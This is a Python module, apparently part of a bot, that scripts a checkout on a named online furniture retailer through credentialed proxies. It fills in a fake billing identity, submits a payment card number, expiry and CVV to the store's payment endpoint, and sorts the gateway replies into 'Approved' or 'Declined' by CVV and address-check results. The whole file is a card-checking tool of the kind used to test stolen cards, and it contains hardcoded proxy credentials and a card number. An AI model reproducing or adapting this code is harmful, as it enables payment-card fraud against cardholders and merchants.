import requests , json , time , re , asyncio
from ....core.logger import log
log.info("Imported XYON on bot")
def cleanhtml(raw_html):
    CLEANR = re.compile('<.*?>') 
    cleantext = re.sub(CLEANR, '', raw_html)
    return cleantext
def C( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None

def find_between( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None
proxies={
        "http": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/",
        "https": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/"
    }
def first(r):
    a = r.get('https://www.williamdscott.com/shop/lighting/lamps/table-lamps/candace-lamp-olive-32057',proxies=proxies).text
    uenc = C(a,'/add/uenc/','/')
    product = C(a,'{"items":{"','"')
    key = C(a,'name="form_key" type="hidden" value="','"')
    return uenc , product , key

def sec(r,u,p , key):
    headers = {'authority': 'www.williamdscott.com',
'accept': 'application/json, text/javascript, */*; q=0.01',
'accept-language': 'en-US,en;q=0.5',
'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryPrZFrsPcPwr88RgB',
'cookie': f'form_key={key};',
'origin': 'https://www.williamdscott.com',
'referer': 'https://www.williamdscott.com/shop/lighting/lamps/table-lamps/candace-lamp-olive-32057',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'}
    a = r.post(f'https://www.williamdscott.com/checkout/cart/add/uenc/{u}/product/{p}/',proxies=proxies,headers = headers ,data = f'''------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="product"

{p}
------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="selected_configurable_option"


------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="related_product"


------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="item"

{p}
------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="form_key"

{key}
------WebKitFormBoundaryPrZFrsPcPwr88RgB
Content-Disposition: form-data; name="qty"

1
------WebKitFormBoundaryPrZFrsPcPwr88RgB--''').text

    php = dict(r.cookies)['PHPSESSID']
    return php
    
def th(r,php,key):
    headers = {'authority': 'www.williamdscott.com',
'accept': '*/*',
'accept-language': 'en-US,en;q=0.5',
'content-type': 'application/json',
'cookie': f'form_key={key}; PHPSESSID={php}',
'origin': 'https://www.williamdscott.com',
'referer': 'https://www.williamdscott.com/shop/lighting/lamps/table-lamps/candace-lamp-olive-32057',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'}
    a = r.post('https://www.williamdscott.com/rest/default/V1/carts/billing-validate-address',proxies=proxies,headers=headers,data='{"address":{"countryId":"US","regionId":43,"region":"New York","street":["265 Main St"],"company":"","telephone":"18032011712","postcode":"10080-0001","city":"New York","firstname":"jhon","lastname":"doe"}}').text
    # print(a)

def final(r,php , key):
    headers = {'authority': 'www.williamdscott.com',
'accept': 'application/json, text/javascript, */*; q=0.01',
'accept-language': 'en-US,en;q=0.5',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': f'form_key={key}; PHPSESSID={php}',
'origin': 'https://www.williamdscott.com',
'referer': 'https://www.williamdscott.com/checkout',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'}
    a = r.post('https://www.williamdscott.com/jola_checkout/sendcard/request',proxies=proxies,data=f'data%5Bbilling%5D%5Bname%5D=jhon+doe&data%5Bbilling%5D%5Baddress%5D=265+Main+St&data%5Bbilling%5D%5Bcity%5D=New+York&data%5Bbilling%5D%5Bstate%5D=New+York&data%5Bbilling%5D%5BpostalCode%5D=10080-0001&data%5Bbilling%5D%5Bcountry%5D=US&data%5Bshipping%5D%5Bname%5D=jhon+doe&data%5Bshipping%5D%5Baddress%5D=265+Main+St&data%5Bshipping%5D%5Bcity%5D=New+York&data%5Bshipping%5D%5Bstate%5D=New+York&data%5Bshipping%5D%5BpostalCode%5D=10080-0001&data%5Bshipping%5D%5Bcountry%5D=US&data%5BcardExpirationDate%5D=03%2F24&data%5BcardNumber%5D=5395-2614-1084-4203&data%5Bcvv%5D=012&data%5Bcustomer%5D%5Bemail%5D=aircracker2021%40hotmail.com&data%5Bsave_cc%5D=true&form_key={key}',headers=headers).text
    # print(a.text)
    a = json.loads(a)
    # print(a)
    overall = a['paymentResponse']
    message = json.loads(overall)['gatewayResponse']['message']
    cvv =  json.loads(overall)['gatewayResponse']['cvvResult']
    avs = json.loads(overall)['gatewayResponse']['avsResult']
    if cvv == 'CVV matches':
        cvv = 'M'
    elif cvv == 'CVV does not match':
        cvv = 'N'
    elif cvv == None:
        cvv = 'U/A'
    if 'Thank you' in a:
        return  f'{message}',f"{avs}", f'{cvv}',"✅", 'Approved'
    if 'CVV does not match' in a:
        return  f'{message}',f"{avs}", f'{cvv}',"✅", 'Approved'
    elif 'Insufficient Funds' in message:
        return "Insufficient Funds",f"{avs}",f'{cvv}',"✅","Approved"
    else:
        mess = cleanhtml(message).strip()
        r_respo = mess if mess else "DECLINED / UNKNOWN ERROR"
        return r_respo,f"{avs}",f'{cvv}',"❌", 'Declined'